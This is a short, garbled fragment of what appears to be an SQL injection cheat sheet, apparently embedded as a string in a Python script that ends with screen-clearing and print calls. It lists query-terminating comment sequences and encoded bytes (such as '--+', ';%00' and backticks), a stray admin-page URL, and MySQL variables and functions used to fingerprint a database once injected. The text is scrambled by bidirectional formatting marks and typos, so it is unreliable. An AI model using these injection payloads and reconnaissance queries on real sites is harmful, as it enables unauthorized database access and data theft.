 ‫‪--‬‬ ‫‪-‬‬
‫‪SQL‬‬ ‫‪comment‬‬
‫‪--+‬‬
‫‪--+-‬‬
‫‪+--+‬‬
‫*‪/‬‬
‫‪C-style‬‬ ‫‪comment‬‬
‫‪,'a'--‬‬ ‫‪-‬‬
‫‪NUL‬‬ ‫‪Nullbyte‬‬ ‫‪(MySQL‬‬ ‫<‬ ‫)‪5.1‬‬
‫>>>‬ ‫‪Note:‬‬ ‫‪The‬‬ ‫‪backtick‬‬ ‫‪can‬‬ ‫‪only‬‬ ‫‪be‬‬ ‫‪used‬‬ ‫‪to‬‬ ‫‪end‬‬ ‫‪a‬‬ ‫‪query‬‬ ‫‪when‬‬ ‫‪used‬‬ ‫‪as‬‬ ‫‪an‬‬ ‫‪alias‬‬
‫‪;%00‬‬
‫!‪;%00‬‬
‫‪%60‬‬ ‫`‬ ‫‪Backtick‬‬
‫‪`alias‬‬ ‫‪starts‬‬
‫‪Hash‬‬ ‫‪comment,‬‬ ‫‪line‬‬ ‫‪comment,‬‬ ‫‪continue‬‬ ‫‪on‬‬ ‫‪newline‬‬
‫‪SYN‬‬
‫‪LF‬‬
‫‪CR‬‬
‫‪VT‬‬
‫‪FF‬‬
‫‪%23‬‬ ‫‪#‬‬
‫‪%16‬‬
‫‪%0A‬‬
‫‪%0D‬‬
‫‪%0B‬‬
‫‪%0C‬‬
‫;'`‬
‫;''‬
‫‪--%a0‬‬


-------------------------------------------------------------------------
found admin page
----------------------------


https://www.adminbooster.com/tool/site_review


@@port:Check Ports
@@version_compile_os:Check which Operationg system is running
@@CHARACTER_SET_FILESYSTEM: tell File system:
@@version_compile_machine:Check 32 bit/64 bit
@@hostname:Current Hostname
@@tmpdir:Tept Directory
@@datadir:Data Directory
@@version:Version of DB
@@basedir:Base Directory
user():Current User
database():Current Database
version():Version
schema():current Database
UUID():System UUID key
current_user():Current User
current_user:Current User
system_user():Current Sustem user
session_user():Session user
@@GLOBAL.have_symlink:Check if Symlink Enabled or Disabled
@@GLOBAL.have_ssl:Check if it have ssl or not
-------------------------------





cf7-database




'''



clear()
print(extra)
input("[Pres Enter]")

clear()
